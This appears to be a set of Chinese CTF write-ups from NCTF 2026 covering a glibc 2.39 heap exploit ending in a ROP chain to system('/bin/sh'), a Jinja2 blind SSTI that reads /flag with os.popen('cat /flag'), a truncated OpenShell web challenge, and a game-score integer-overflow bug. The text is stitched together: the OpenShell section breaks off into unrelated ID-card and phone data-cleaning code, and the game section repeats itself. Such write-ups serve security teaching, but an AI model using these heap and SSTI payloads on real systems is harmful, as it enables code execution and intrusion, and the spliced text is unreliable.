ezheap WP

题目信息

  • 题目名：ezheap
  • 附件：pwn、libc.so.6
  • 架构：amd64
  • 保护：Full RELRO、Canary、NX、PIE、SHSTK、IBT
  • glibc：附件自带 libc.so.6，版本为 2.39

本题的核心是一个典型的 off-by-null，但最终利用并不是传统的“直接重叠后改 __free_hook”，而是：

  1. 先通过 show 拿到 libc 和 heap 泄露
  2. 用 off-by-null + backward consolidation 做出重叠
  3. 借助一次 largebin attack 改写 mp_.tcache_bins
  4. 利用 glibc 2.39 上被放大的 tcache OOB 行为，完成三次“任意地址分配”
  5. 先泄 stack，再泄 PIE，再伪造 chunks/sizes
  6. 最后通过伪造出的 chunk 索引，直接把 edit_chunk 的保存现场改成 ROP，起 /bin/sh

远程最终拿到的 flag 为：

nctf{c6d45d25-0a89752cefb8e5d-21e2f9bd9}

程序功能分析

程序提供 4 个菜单功能：

  1. add
  2. edit
  3. delete
  4. show

索引范围是 0..31，chunk size 限制在：

0x450 <= size <= 0x550

对应反汇编里 add_chunk 的判定如下：

cmp [size], 0x44f
jle invalid
cmp [size], 0x550
jle ok

这意味着本题所有 chunk 都是偏大的 chunk，正常情况下不会进默认的 tcache 范围。

关键漏洞点：edit 的 off-by-null

edit_chunk 的关键逻辑是：

read(0, chunk, size)
chunk[read_len] = 0

对应反汇编：

15f0: call read@plt
15f5: add rax, rbx
15f8: mov BYTE PTR [rax], 0x0

如果 read_len == size，那么最后这个 chunk[read_len] = 0 就会向后多写一个字节。

这正是本题的唯一核心漏洞。

漏洞利用总览

整条利用链可以概括为：

show 泄露 libc/heap
    ->
off-by-null 改 next chunk size，触发 backward consolidation
    ->
拿到 overlap
    ->
largebin attack 改 mp_.tcache_bins
    ->
free 0x500 chunk 时进入 OOB tcache entry
    ->
三次任意地址分配：
    1. 泄 stack
    2. 泄 PIE
    3. 分配到 .bss，伪造 chunks/sizes
    ->
伪造 idx17 指向栈
    ->
edit(17) 改 saved rbp/saved rip
    ->
ROP -> system("/bin/sh")

本题最绕的地方不在 off-by-null 本身，而在 glibc 2.39 里如何把一次 largebin attack 转成后续稳定的任意地址分配。

第一步：泄露 libc 和 heap

先做如下堆布局：

add(20, 0x450)
add(21, 0x450)
add(22, 0x550)
add(23, 0x550)

delete(22)
delete(20)
delete(21)

add(24, 0x550)
add(25, 0x450)
leak = show(25)

这里利用的是 unsorted bin / large chunk 释放后的残留指针，通过 show(25) 可以同时看到：

  • libc 指针
  • heap 指针

在本题中偏移稳定为：

libc.address = u64(leak[:8]) - 0x204040
heap_leak = u64(leak[0x10:0x18])
fake_chunk = heap_leak + 0xE40

这里 fake_chunk 是后面伪造 backward consolidation 用的假 chunk 头位置。

第二步：off-by-null 触发 backward consolidation，制造 overlap

申请 4 个连续的 0x4f8：

add(0, 0x4f8)
add(1, 0x4f8)
add(2, 0x4f8)
add(3, 0x4f8)

然后构造两个关键写入。

1. edit(0)：在 chunk0 末尾附近布置 fake chunk header

payload0  = b"A" * 0x10
payload0 += p64(0)
payload0 += p64(0x9e1)
payload0 += p64(fake_chunk) * 4
payload0  = payload0.ljust(0x4f0, b"A")
edit(0, payload0)

这里相当于在后方准备一个“看起来像合法 free chunk”的头。

2. edit(1)：写满整个 chunk1，触发一字节越界清零

edit(1, b"B" * 0x4f0 + p64(0x9e0))

size == 0x4f8，所以当 read() 读满时：

  • 最后 8 个字节会覆盖到下一个 chunk 的 prev_size
  • 额外的 \x00 会把下一个 chunk 的 size 最低字节清零

这样在 free(chunk2) 时，glibc 会错误地认为前一个 chunk 是 free 的，于是发生 backward consolidation。

3. free + malloc 拿 overlap

delete(2)
add(4, 0x550)

这时 idx4 就会从合并后的大块中切出来，并和 idx1 形成重叠。

验证方式：

marker = b"Z" * 0x120 + b"Y" * (0x550 - 0x120)
edit(4, marker)
leak = show(1)

如果 show(1) 前段能看到大量 Y，说明 overlap 已成立。

第三步：借 overlap 做一次 largebin attack

本题真正的关键点在这里。

由于默认 tcache 最多只覆盖到 0x408 左右，而我们的 chunk 都在 0x500 左右，必须先修改 glibc 的 malloc_par 参数，才能把大 chunk 引导进 tcache 相关逻辑。

最终稳定做法是只打一发：

mp_.tcache_bins

其地址为：

libc.address + 0x2031e8

堆布局

add(5, 0x510)
add(6, 0x450)
add(8, 0x508)
add(9, 0x550)
add(10, 0x4f8)

然后：

delete(5)
add(7, 0x550)
delete(8)

含义如下：

  • idx5 对应的实际 chunk size 是 0x520，先进入 unsorted，再被下一次 malloc 推到 largebin
  • idx8 对应实际 chunk size 是 0x510，留在 unsorted，作为 largebin attack 的“插入触发器”

修改 largebin chunk 的 bk_nextsize

由于 idx4 和 idx1 重叠，show(1) 能读到 largebin chunk 的头。实践中：

  • largebin chunk 头在 show(1) 数据里的偏移是 0x70
  • bk_nextsize 偏移在 0x70 + 0x28

于是只改这一项：

cur = bytearray(show(1))
cur[0x70 + 0x28 : 0x70 + 0x30] = p64(libc.address + 0x2031e8 - 0x20)
edit(1, bytes(cur))

注意必须“只改 8 字节”，不能把整片 largebin header 用垃圾数据覆盖掉，否则 attack 会直接失效。

触发 largebin attack

add(12, 0x550)

这样就能把：

mp_.tcache_bins

改写成堆地址，从而影响后续大 chunk free 时的 tcache 下标访问。

第四步：glbic 2.39 上的 OOB tcache 行为

这一段是整题的核心利用技巧。

在 glibc 2.39 中，本题这条链最终不是把大 chunk 正常塞进传统 tcache，而是通过改坏 mp_.tcache_bins，让 0x500 附近大小的 chunk 在 free 时访问到 越界的 tcache entry。

实际观察后可以发现：

  • 对应 0x4f8 请求大小的 tcache index 会落到一个 OOB 槽位
  • 这个 OOB 槽位实际映射到了某个可控堆块用户区中
  • 在本题布局下，这个槽位稳定落在 idx24 用户区偏移 0x60

所以后续就可以这样玩：

  1. free 某个 0x4f8 chunk，让它成为 OOB tcache bin 的头指针
  2. 通过 edit(24) 改 idx24+0x60，等价于改这个 bin 的 head
  3. 再次 malloc(0x4f8)，就能拿到“任意地址分配”

脚本里把这个过程封装成：

def poison_oob_tcache(io, fill_idx, patch24, target):
    delete_sync(io, fill_idx)
    patch24 = bytearray(patch24)
    patch24[0x60:0x68] = p64(target)
    edit(io, 24, bytes(patch24[:0x68]))

其中：

  • fill_idx 是拿来 free 进去填充这个 OOB tcache 的 0x4f8 chunk
  • target 是下一次想让 malloc(0x4f8) 返回的地址

第五步：第一次任意分配，泄露 stack

第一次把 OOB tcache 的返回地址指向：

libc.sym.environ - 0x18

利用流程：

poison_oob_tcache(io, 3, chunk24_view, libc.sym.environ - 0x18)
add(io, 13, 0x4f8)
stack_view = show(io, 13)
stack_leak = u64(stack_view[0x18:0x20])

为什么是 -0x18？

因为 show 读一整块用户区，把目标地址附近一段内存原样打印出来。通过本地和远端调试可以看到：

  • environ 附近真正有用的栈指针正好落在这段窗口中的 0x18

于是得到稳定的：

stack_leak

第六步：第二次任意分配，泄露 PIE

有了一个栈地址之后，还不够，因为程序是 PIE，后面要改 .bss 就必须知道二进制基址。

于是第二次任意分配不直接写栈，而是先把一个 chunk 分配到更低的一段栈窗口：

pie_target = (stack_leak - 0x300) & ~0xF
poison_oob_tcache(io, 0, chunk24_view, pie_target)
add(io, 14, 0x4f8)
pie_view = show(io, 14)

然后在 pie_view 里扫描返回地址。

实践中，这个更低的栈窗口里会稳定出现这些代码地址：

  • main 附近
  • _start 附近
  • read_long/read_line 附近

对应脚本里的已知偏移表：

candidates = [0x1842, 0x1160, 0x1185, 0x13f4, 0x12e3, 0x16BB, 0x18A5]

扫描逻辑：

def recover_pie(stack_window):
    for off in range(0, len(stack_window) - 8, 8):
        qword = u64(stack_window[off : off + 8])
        for code_off in candidates:
            base = qword - code_off
            if base & 0xFFF == 0 and 0x550000000000 <= base < 0x700000000000:
                return base

最后恢复：

elf.address = recover_pie(pie_view)

第七步：第三次任意分配，落到 .bss 伪造 chunks/sizes

前两次任意分配都是为了“读地址”。最后一次才是实际控制流利用。

程序的 .bss 上有两个全局数组：

chunks[32];
sizes[32];

地址分别在：

  • chunks：elf.address + 0x4060
  • sizes：elf.address + 0x4160

脚本最终选择把任意分配放到：

bss_target = elf.address + 0x40D0  # chunks[14]

然后：

poison_oob_tcache(io, 10, chunk24_view, bss_target)
add(io, 16, 0x4f8)

此时 idx16 实际已经不是普通堆块，而是落在 .bss 上的一块“伪 chunk”。

伪造一个新的索引 17

我们希望后续 edit(17) 时：

  • chunks[17] 指向栈上的某个关键位置
  • sizes[17] 给一个足够大的可写长度

通过调试可知，在最终执行 edit(17) 时，想要命中的位置是：

stack_target = stack_leak - 0x158

这对应 edit_chunk 保存的 rbp/rip 区域。

于是写 .bss：

bss_payload = bytearray(b"B" * 0x120)
bss_payload[0x18:0x20] = p64(stack_target)  # chunks[17]
bss_payload[0x118:0x120] = p64(0x4F8)       # sizes[17]
edit(io, 16, bytes(bss_payload))

为什么是这两个偏移？

因为 idx16 这块伪 chunk 正好覆盖了：

  • chunks[17]
  • sizes[17]

对应关系通过 .bss 相对布局可以直接算出。

至此，程序层面上已经等价于：

chunks[17] = stack_target;
sizes[17] = 0x4f8;

第八步：edit(17) 直接改 saved rbp / saved rip

现在调用：

edit(io, 17, chain)

就不再是在写普通 heap，而是在写：

edit_chunk 自己栈上的保存现场

最终 ROP 很简单：

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address
bin_sh = next(libc.search(b"/bin/sh\x00"))

fake_rbp = stack_target + 0x200
chain = flat(
    fake_rbp,
    ret,
    pop_rdi,
    bin_sh,
    libc.sym.system,
)

写进去之后，edit_chunk 返回时直接跳到：

system("/bin/sh")

随后发命令即可：

io.sendline(b"echo PWNED; id; /bin/echo MARK")

为什么这题能直接改返回地址

checksec 会显示：

  • SHSTK
  • IBT

但实际利用里，直接改 edit_chunk 的保存返回地址仍然可以成功拿 shell。

这说明至少在本题本地/远端运行环境里：

  • 虽然 binary 带有相关属性
  • 但最终没有形成会阻止这条链的有效运行时约束

实战里不应该被 checksec 结果吓住，还是要以真实可利用行为为准。

关键偏移总结

libc / heap

libc.address = u64(leak[:8]) - 0x204040
heap_leak    = u64(leak[0x10:0x18])
fake_chunk   = heap_leak + 0xE40

idx24 + 0x60

1) libc.sym.environ - 0x18

这题的几个关键点

1. 真正的漏洞只是一个字节

本题所有复杂利用，根源都只是：

read 满后多写 1 字节 0

但由于 chunk size 恰好都在 0x500 附近，这个一字节正好足够打出 backward consolidation。

2. 第一发 largebin attack 不要“整块乱写”

实践中最容易翻车的是：

直接用一整块新数据去 edit(1)

这样会把 overlapped 的 largebin chunk 头一起破坏掉，导致 attack 失效。

正确做法是：

cur = bytearray(show(1))
只修改 bk_nextsize 的 8 字节

3. glibc 2.39 下的利用重点不是老式 hook

本题不需要走：

  • __free_hook
  • __malloc_hook

真正稳定的路径是：

一次 largebin attack
    ->
放大 tcache 行为
    ->
OOB tcache entry
    ->
任意地址分配

4. 最终不要急着直接把 chunk 分配到栈上改返回

直接把第二次任意分配放到活跃栈帧上，容易让 malloc/add 自己先崩。

更稳的链是：

先读 stack
再读 PIE
再把 chunk 放到 .bss
伪造一个新的 idx
最后用这个 idx 去写栈

这也是本题 exploit 最终稳定下来的关键。

结论

这题表面是 ezheap，但实际上是一个比较完整的现代 glibc 2.39 堆利用题：

  • 起手是 off-by-null
  • 中间是 backward consolidation
  • 核心转折点是 largebin attack
  • 后段利用的是 tcache 越界控制
  • 最后再配合 .bss 伪造索引，把任意地址写转换成稳定控制流劫持

从利用体验上说，这题最值钱的部分不是“怎么打一字节越界”，而是：

怎么把一次 overlap 过渡成稳定、可复现、适配本地和远端的完整 exploit

这个版本的 exp.py 已经可以完整复现这条链。

HORSE

Flag:

NCTF{af811a863975_W3lcOMe_TO_n(7f}

题目现象

访问首页是一个登录页：

  • 只有 GET /
  • 参数是 username 和 password
  • username 会被直接回显到 Welcome: ...
  • password 只用于判空

测试：

/?username=admin&password=1

页面会显示：

Welcome: admin

同时还可以发现一个异常点：

  • {{7*7}} 正常回显，不会计算
  • 但 {{1/0}} 会触发 500
  • {{1/1}} 又是正常 200

这说明这里不是普通的反射 XSS 终点，后端对 username 还存在一条“会求值表达式并在出错时 500”的逻辑，可以当作盲注 oracle 用。

利用思路

目标是把 username 构造成 Jinja2 表达式，用“是否报错”作为真假通道。

先确认 Flask/Jinja 上下文对象可用：

{{1/(request is not none)}}
{{1/(config is not none)}}
{{1/(url_for is not none)}}

这些请求返回 200，说明表达式被执行了。

然后拿到 os：

{{1/('os' in url_for.__globals__)}}

返回 200，说明可以从 url_for.__globals__ 进入 Python 全局变量。

接着确认 /flag 存在：

{{1/(url_for.__globals__['os'].path.exists('/flag'))}}

返回 200。

最后把读文件结果变成布尔判断：

{{1/(url_for.__globals__['os'].popen('cat /flag').read().startswith('NCTF{'))}}

如果前缀正确，请求返回 200；如果前缀错误，表达式变成 1/False，触发除零，返回 500。

这样就能逐字符盲读 /flag。

手工验证

例如：

{{1/(url_for.__globals__['os'].popen('cat /flag').read().startswith('NCTF{65'))}}

返回 200，说明 flag 前缀是：

NCTF{65

继续枚举即可。

自动化脚本

题目目录下写了自动盲读脚本：

ssti_flag_reader.py /mnt/e/Desktop/nctf/web/n-horse/ssti_flag_reader.py

用法：

python3 /mnt/e/Desktop/nctf/web/n-horse/ssti_flag_reader.py \
  --url http://114.66.24.221:42251/ \
  --prefix 'NCTF{'

也支持断点续跑，例如：

python3 /mnt/e/Desktop/nctf/web/n-horse/ssti_flag_reader.py \
  --url http://114.66.24.221:42251/ \
  --prefix 'NCTF{655033259c07_We!'

脚本核心逻辑：

  1. 构造表达式 {{1/(cat /flag 的结果.startswith(prefix))}}
  2. 返回 200 说明前缀正确
  3. 返回 500 说明前缀错误
  4. 逐字符扩展直到读到 }

最终 payload 核心

盲读核心表达式：

{{1/(url_for.__globals__['os'].popen('cat /flag').read().startswith('NCTF{...'))}}

利用点本质是：

  • username 进入了一个会执行表达式的模板上下文
  • url_for.__globals__ 可达 os
  • 可通过 os.popen('cat /flag').read() 读取 flag
  • 用除零异常把结果转成布尔 oracle

备注

这题表面上最显眼的是反射型 XSS，但真正稳定拿 flag 的方向是服务端模板表达式盲注。

NCTF 2026 OpenShell Writeup

题目信息

  • 题目：OpenShell
  • 类型：Web
  • 平台：GZCTF DynamicContainer
  • 最终通过提交的动态 flag：
flag{45bf5920-d096-4e78-bb69-c9a14c9e7b17}

一、题目本体分析

附件很小，核心文件只有三个：

  • OpenShell/app/bot.js
  • OpenShell/entrypoint.sh
  • OpenShell/Dockerfile

1. flag 的落点

OpenShell/entrypoint.sh：

echo $GZCTF_FLAG > /flag
unset GZCTF_FLAG

chown node:node /flag
chmod 000 /flag

这几行说明了几件事：

  1. 动态 flag 会由平台注入为环境变量 GZCTF_FLAG
  2. 容器启动时把 flag 写入 /flag
  3. 随后 unset GZCTF_FLAG，所以不能指望后续再从环境变量里直接拿
  4. /flag 被改成 000，正常情况下即使 RCE 了，也未必能直接读

所以如果走“业务预期解”，大概率是想办法借助 opencode web 的本地能力来读文件。

2. bot 的访问模型

OpenShell/app/bot.js：

await page.goto(url, { waitUntil: "domcontentloaded", timeout: 15_000 });
await page.waitForTimeout(15_000);

以及：

if (!parsed.hostname.endsWith('.pages.dev')) {
    return res.status(400).json({

        error: "invalid url",

  1. bot 只访问 http/https
  2. hostname 必须以 .pages.dev 结尾
  3. 页面加载后会停留约 15 秒

这意味着典型思路是：

  • 找一个可控的 pages.dev 页面
  • 让 bot 打开
  • 在 bot 里执行 JS
  • 再想办法访问容器里的本地服务

1. 统一文本标准化

  • 用正则去掉非数字字符

  • 前三位在白名单中：
135,136,137,138,139,150,151,152,158,159,186,188

3. 身份证清洗规则

身份证清洗：

  • 标准化
  • 转大写
  • 只保留 [0-9X]

校验规则使用 GB 11643-1999 的第 18 位校验位算法：

前 17 位权重：

[7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]

映射表：

"10X98765432"

如果：

  • 长度不是 18，直接无效
  • 前 17 位不是数字，最后一位不是 [0-9X]，无效
  • 否则按校验位规则判断

这里额外验证了一下生日位合法性，发现不会影响结果，所以只做校验位判断即可。

4. 余额清洗规则

余额字段处理方式：

  • 标准化
  • 删除 ¥
  • 删除 CNY
  • 删除逗号
  • 保留负号和数字

  • ¥437,270 -> 437270
  • 171,117CNY -> 171117
  • -1,480CNY -> -1480

最后用 Decimal 处理，避免浮点误差。

from decimal import Decimal

W = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
V = "10X98765432"

def norm_text(s):
    s = "" if s is None else str(s)
    s = unicodedata.normalize("NFKC", s)
    s = s.translate(REMOVE)
    return s.strip()

def norm_phone(s):
    digits = re.sub(r"\D", "", norm_text(s))
    if len(digits) == 13 and digits.startswith("86"):
        digits = digits[2:]
    return digits

def valid_phone(p):
    return len(p) == 11 and p[:3] in ALLOWED

def norm_id(s):
    return re.sub(r"[^0-9X]", "", norm_text(s).upper())

def valid_id(i):
    if len(i) != 18 or not re.fullmatch(r"\d{17}[0-9X]", i):
        return False
    return V[sum(int(a) * b for a, b in zip(i[:17], W)) % 11] == i[-1]

def norm_bal(s):
    s = re.sub(r"[^0-9.\-]", "", norm_text(s).upper())

协议

服务是自定义二进制协议：

request  = b"GAME" + be32(9 + len(payload)) + cmd(1 byte) + payload
response = b"GAME" + be32(9 + len(payload)) + type(1 byte) + payload

命令如下：

  • 1: 领奖
  • 2: 查询当前分数/排名
  • 3: 查询排行榜概览
  • 4: reset
  • 5: 随机匹配一个 score <= 50 的对手
  • 6: 查看棋盘
  • 7: 落子，payload 形如 b"7,7"
  • 8: 认输；如果棋盘还空，则相当于 Draw Delta=0，可以无损重抽对手

关键逻辑

领奖条件在 cmd=1：

  • 取排行榜第一名
  • 判断第一名名字是否等于当前玩家 player
  • 相等则返回 GZCTF_FLAG

所以核心是把共享账号 player 送到榜一。

漏洞点

关键函数是 score_apply_buggy_update。

正常更新函数会把负分钳到 0，但 buggy 版本有一条特殊分支：

  • 如果当前分数 <= 9 且本次 delta < 0，就直接返回当前分数，不再继续减
  • 否则直接返回 current + delta

真正的问题出在数据库写入：

  • db_update_player_score 调用 sqlite3_bind_int64
  • 但传参时只写了 32 位寄存器
  • 当返回值是负的 32 位整数时，会被零扩展成超大的 64 位无符号值

于是只要让当前分数处于 > 9，再输一局使 current + delta < 0，就会把分数写成类似 4294967295 的超大正数。

1. 协议分析

程序使用自定义二进制协议：

packet = b"GAME" + be32(9 + len(payload)) + cmd(1 byte) + payload

返回包格式相同。

请求中的 cmd 已确认只有 0..8 这些分支。

2. 各命令作用

逆向和实测后可以得到：

  • cmd=1：领奖
  • cmd=2：查询当前分数和排名
  • cmd=3：查看排行榜概览
  • cmd=4：重置题目状态
  • cmd=5：随机匹配一个 score <= 50 的对手
  • cmd=6：查看棋盘
  • cmd=7：下子，payload 形如 b"7,7"
  • cmd=8：认输；如果棋盘还是空的，则按和棋结算

其中有一个非常重要的细节：

  • 空棋盘直接 cmd=8 会返回 Draw Delta=0
  • 也就是说可以无损重抽对手

这使得我们可以不断匹配，直到抽到想要的分数目标。

3. cmd=1 的领奖条件

cmd=1 的逻辑非常直接：

  1. 查询排行榜第一名
  2. 判断第一名名字是否为当前玩家 player
  3. 如果是，就返回环境变量 GZCTF_FLAG
  4. 否则返回 Permission denied

所以本题最终目标就是：

让 player 变成排行榜第一

4. reset 后的对手池

cmd=4 会把环境重置到一组固定状态。结合逆向和实测，可以观察到低分对手池基本是：

50, 40, 30, 20, 20, 10, 2000000

其中 2000000 那个显然不是拿来正常打的，真正可操作的是 <= 50 的这些机器人。

5. 稳定赢 10 分 AI

对 10 分 AI 已经验证出一条稳定必胜线路：

7,7 -> 8,7 -> 9,7 -> 10,7 -> 11,7

实测会形成横向五连，结算为：

这一点非常关键，因为它同时完成了两件事：

  1. 把自己从 50 提高到 53
  2. 把原来的 10 分对手打成 7 分

后面最后一步溢出，正是要输给这个 7 分对手。

6. 关键漏洞：负分被写成超大正数

题目里有一个特殊计分函数 score_apply_buggy_update。它的意图是做“压分保护”：

  • 如果当前分数 <= 9
  • 并且这次 delta < 0
  • 那么直接返回当前分数，不再扣分

可以理解成：

if (score <= 9 && delta < 0)
    return score;
else
    return score + delta;

真正的漏洞点在于：

  • 当当前分数 > 9 时，程序仍然会执行 score + delta
  • 如果这一步算出来是负数
  • 后续写库/显示时发生了有符号数和无符号数混用
  • 最终 -1 会变成 4294967295

也就是：

-1 -> 0xffffffff -> 4294967295

一旦出现这个结果，player 就会直接变成榜一。

7. 如何构造出 10 + delta = -1

思路是把自己精确送到 10 分，然后去输给 7 分对手。

为什么是 7 分？

因为在 10 分打输给 7 分对手时，实测结算是：

Delta = -11
10 + (-11) = -1

这就正好命中溢出点。

8. 可达分数链

远端上可以稳定走出下面这条链：

50 --Win 10--> 53
53 --Lose 20--> 37
37 --Lose 20--> 23
23 --Lose 30--> 15
15 --Lose 38--> 10
10 --Lose 7 --> -1 --> 4294967295

拆开解释：

第一步：赢 10 分对手

初始是 50。

抽到 10 分机器人后，按固定必胜序列下：

7,7 -> 8,7 -> 9,7 -> 10,7 -> 11,7

得到：

50 -> 53

同时，该机器人会从 10 变成 7，被留作最后一步使用。

第二步到第五步：故意输棋调分

接下来故意输给指定分数的对手：

53 --Lose 20--> 37
37 --Lose 20--> 23
23 --Lose 30--> 15
15 --Lose 38--> 10

这里的 38 不是 reset 初始就有的，而是经过前面若干步后对手池自然演化出来的分数。

最后一步：10 分输给 7 分

抽到第一步里被我们打成 7 分的那个对手，故意输掉：

10 --Lose 7--> -1

程序最终显示为：

OK Score=4294967295 Rank=1

此时再调用 cmd=1 就能拿到 flag。

9. 为什么这个 exp 可以单连接完成

这题远端在多连接场景下会有一些不稳定现象，容易误判状态。所以最稳的打法反而是：

  • 全程只用一条 TCP 连接
  • 不断 cmd=5 抽对手
  • 如果不是想要的分数，就空棋盘 cmd=8
  • 用 Draw Delta=0 无损重抽

这样就不需要处理并发、实例漂移、共享状态污染之类的问题。
